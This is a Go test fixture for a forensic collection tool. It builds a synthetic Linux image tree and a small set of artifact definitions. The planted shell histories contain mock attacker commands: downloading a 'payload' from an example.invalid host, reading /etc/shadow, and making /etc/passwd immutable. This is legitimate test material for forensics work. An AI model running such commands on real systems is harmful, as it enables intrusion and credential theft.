// Package fixture builds a synthetic image tree that exercises the cases a
// forensic collector actually has to get right.
//
// Everything is deterministic: same tree, same permissions, same timestamps, so
// two tools run against it can be compared byte for byte.
package fixture

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
)

// Build creates the tree under root and returns it. It is safe to call on an
// existing empty directory.
func Build(root string) error {
	mk := func(p string, mode os.FileMode) error {
		return os.MkdirAll(filepath.Join(root, p), mode)
	}
	write := func(p string, data string, mode os.FileMode) error {
		full := filepath.Join(root, p)
		if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
			return err
		}
		if err := os.WriteFile(full, []byte(data), 0644); err != nil {
			return err
		}
		return os.Chmod(full, mode)
	}

	for _, d := range []string{
		"etc", "etc/ssh", "var/log", "var/tmp", "tmp",
		"root/.ssh", "home/alice/.ssh", "home/bob/.config",
		"usr/bin", "usr/local/bin", "opt/app/logs",
		"dev", "proc", "empty",
	} {
		if err := mk(d, 0755); err != nil {
			return err
		}
	}

	// Account databases. These drive %user_home% expansion and the no_user /
	// no_group rules, and they are read from the image rather than the host.
	if err := write("etc/passwd", ""+
		"root:x:0:0:root:/root:/bin/bash\n"+
		"alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"+
		"bob:x:1001:1001:Bob:/home/bob:/bin/sh\n"+
		"daemon:x:2:2:daemon:/usr/sbin:/usr/sbin/nologin\n", 0644); err != nil {
		return err
	}
	if err := write("etc/group", "root:x:0:\nalice:x:1000:\nbob:x:1001:\n", 0644); err != nil {
		return err
	}
	if err := write("etc/hostname", "fixture-host\n", 0644); err != nil {
		return err
	}
	// Makes the tree identifiable as a Linux image, which is what drives
	// supported_os filtering.
	if err := write("etc/os-release", "ID=fixture\nNAME=\"Fixture Linux\"\n", 0644); err != nil {
		return err
	}
	if err := write("etc/ssh/sshd_config", "PermitRootLogin no\n", 0644); err != nil {
		return err
	}

	// Shell rc files naming a HISTFILE elsewhere: the two-phase artifacts have
	// to read these, extract the path, then collect what it points at.
	if err := write("home/alice/.bashrc", "export PS1='$ '\nHISTFILE=~/.hidden_history\nexport HISTSIZE=1000\n", 0644); err != nil {
		return err
	}
	if err := write("home/alice/.hidden_history", "sudo su -\nwget http://example.invalid/payload\n", 0600); err != nil {
		return err
	}
	if err := write("root/.bashrc", "HISTFILE=/var/log/root_history\n", 0644); err != nil {
		return err
	}
	if err := write("var/log/root_history", "id\nchattr +i /etc/passwd\n", 0600); err != nil {
		return err
	}
	// A HISTFILE that points nowhere: recorded, not collected, not fatal.
	if err := write("home/bob/.bashrc", "HISTFILE=~/.no_such_history\n", 0644); err != nil {
		return err
	}

	// Shell histories and SSH material: the bread-and-butter file artifacts.
	if err := write("root/.bash_history", "whoami\nid\ncurl http://example.invalid/x\n", 0600); err != nil {
		return err
	}
	if err := write("home/alice/.bash_history", "ls -la\ncat /etc/shadow\n", 0600); err != nil {
		return err
	}
	if err := write("home/alice/.ssh/authorized_keys", "ssh-rsa AAAAB3NzaC1yc2E alice@host\n", 0600); err != nil {
		return err
	}
	if err := write("home/alice/.ssh/authorized_keys2", "ssh-ed25519 AAAAC3NzaC1 alice2\n", 0600); err != nil {
		return err
	}
	if err := write("home/alice/.ssh/known_hosts", "example.invalid ssh-rsa AAAA\n", 0644); err != nil {
		return err
	}
	if err := write("root/.ssh/authorized_keys", "ssh-rsa AAAAB3root root@host\n", 0600); err != nil {
		return err
	}
	// bob has a home but no .ssh: the rule must simply not match.
	if err := write("home/bob/.config/settings.conf", "theme=dark\n", 0644); err != nil {
		return err
	}

	// Logs, including one large enough to exceed a small max_file_size.
	if err := write("var/log/syslog", "Jan  1 00:00:00 host kernel: boot\n", 0640); err != nil {
		return err
	}
	if err := write("var/log/auth.log", "Jan  1 00:00:01 host sshd: accepted\n", 0640); err != nil {
		return err
	}
	if err := write("opt/app/logs/app.log", "started\n", 0644); err != nil {
		return err
	}

	// Permission-bearing files: suid, sgid, world-writable, sticky.
	if err := write("usr/bin/normal", "#!/bin/sh\necho normal\n", 0755); err != nil {
		return err
	}
	// Go's FileMode spells the setuid/setgid/sticky bits with its own flags;
	// the POSIX octal 04755 would silently set nothing.
	if err := write("usr/bin/suid_binary", "#!/bin/sh\necho suid\n", 0755|os.ModeSetuid); err != nil {
		return err
	}
	if err := write("usr/bin/sgid_binary", "#!/bin/sh\necho sgid\n", 0755|os.ModeSetgid); err != nil {
		return err
	}
	if err := write("tmp/world_writable", "anyone can write\n", 0666); err != nil {
		return err
	}
	if err := write("var/tmp/group_writable", "group can write\n", 0664); err != nil {
		return err
	}
	if err := os.Chmod(filepath.Join(root, "tmp"), 0777|os.ModeSticky); err != nil {
		return err
	}

	// Hidden files and directories.
	if err := write(".hidden_root_file", "hidden\n", 0644); err != nil {
		return err
	}
	if err := write("home/alice/.hidden_dir/inside", "nested hidden\n", 0644); err != nil {
		return err
	}

	// Awkward names: spaces, unicode, a newline-free but quote-bearing name.
	if err := write("var/tmp/name with spaces.txt", "spaces\n", 0644); err != nil {
		return err
	}
	if err := write("var/tmp/юникод.txt", "unicode\n", 0644); err != nil {
		return err
	}
	if err := write("var/tmp/single'quote.txt", "quote\n", 0644); err != nil {
		return err
	}

	// A symlink that must never be followed, and one that dangles.
	if err := os.Symlink("/etc/passwd", filepath.Join(root, "etc/passwd.link")); err != nil {
		return err
	}
	if err := os.Symlink("/nonexistent/target", filepath.Join(root, "var/tmp/dangling")); err != nil {
		return err
	}
	// A symlink pointing at a directory: descending it would duplicate the tree.
	if err := os.Symlink("/var/log", filepath.Join(root, "var/log.link")); err != nil {
		return err
	}

	// A hardlink pair: the copy collector must store the bytes once.
	target := filepath.Join(root, "usr/local/bin/original")
	if err := write("usr/local/bin/original", "shared content\n", 0755); err != nil {
		return err
	}
	if err := os.Link(target, filepath.Join(root, "usr/local/bin/hardlink")); err != nil {
		return err
	}

	// A FIFO: opening it without care would block the walk forever.
	if err := mkfifo(filepath.Join(root, "tmp/fifo"), 0644); err != nil {
		return fmt.Errorf("mkfifo: %w", err)
	}

	// Deterministic timestamps so two runs produce identical bodyfiles.
	// Directories are stamped after their contents, since writing a child
	// updates the parent's mtime.
	stamp := time.Date(2024, 3, 15, 12, 0, 0, 0, time.UTC)
	var paths []string
	if err := filepath.Walk(root, func(p string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		paths = append(paths, p)
		return nil
	}); err != nil {
		return err
	}
	// Deepest first.
	for i := len(paths) - 1; i >= 0; i-- {
		// Chtimes on a symlink would follow it; skip those.
		if fi, err := os.Lstat(paths[i]); err == nil && fi.Mode()&os.ModeSymlink != 0 {
			continue
		}
		_ = os.Chtimes(paths[i], stamp, stamp)
	}
	return nil
}

// Artifacts writes a small, self-contained artifact set covering all four
// offline collectors. Using a fixed set rather than UAC's full corpus keeps the
// differential comparison readable when something disagrees.
func Artifacts(dir string) error {
	files := map[string]string{
		"bodyfile/bodyfile.yaml": `version: 1.0
output_directory: /bodyfile
artifacts:
  -
    description: Collect file stat information to create a bodyfile.
    supported_os: [all]
    collector: stat
    path: /
    output_file: bodyfile.txt
`,
		"hash_executables/hash_executables.yaml": `version: 1.0
output_directory: /hash_executables
artifacts:
  -
    description: Hash files that have the +x flag set.
    supported_os: [all]
    collector: hash
    path: /
    file_type: [f]
    permissions: [-001, -010, -100]
    output_file: hash_executables
`,
		"system/suid.yaml": `version: 1.0
output_directory: /system
artifacts:
  -
    description: Find suid files.
    supported_os: [all]
    collector: find
    path: /
    file_type: [f]
    permissions: [-4000]
    output_file: suid.txt
`,
		"system/sgid.yaml": `version: 1.0
output_directory: /system
artifacts:
  -
    description: Find sgid files.
    supported_os: [all]
    collector: find
    path: /
    file_type: [f]
    permissions: [-2000]
    output_file: sgid.txt
`,
		"system/world_writable_files.yaml": `version: 1.0
output_directory: /system
artifacts:
  -
    description: Find world-writable files.
    supported_os: [all]
    collector: find
    path: /
    file_type: [f]
    permissions: [-0002]
    output_file: world_writable_files.txt
`,
		"system/hidden_files.yaml": `version: 1.0
output_directory: /system
artifacts:
  -
    description: Find hidden files.
    supported_os: [all]
    collector: find
    path: /
    file_type: [f]
    name_pattern: [".*"]
    output_file: hidden_files.txt
`,
		"files/ssh/authorized_keys.yaml": `version: 1.0
output_directory: /files
artifacts:
  -
    description: Collect authorized_keys files.
    supported_os: [all]
    collector: file
    path: %user_home%/.ssh/authorized_keys*
    ignore_date_range: true
`,
		"files/shell/bash.yaml": `version: 1.0
output_directory: /files
artifacts:
  -
    description: Collect bash history files.
    supported_os: [all]
    collector: file
    path: %user_home%/.bash_history
    ignore_date_range: true
`,
		"files/system/etc.yaml": `version: 1.0
output_directory: /files
artifacts:
  -
    description: Collect the etc directory.
    supported_os: [all]
    collector: file
    path: /etc
    file_type: [f]
    max_file_size: 1048576
    ignore_date_range: true
`,
		"files/logs/var_log.yaml": `version: 1.0
output_directory: /files
artifacts:
  -
    description: Collect log files.
    supported_os: [all]
    collector: file
    path: /var/log
    file_type: [f]
    max_file_size: 1073741824 # 1GB
    ignore_date_range: true
`,
	}
	for rel, body := range files {
		full := filepath.Join(dir, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
			return err
		}
		if err := os.WriteFile(full, []byte(body), 0644); err != nil {
			return err
		}
	}
	return nil
}
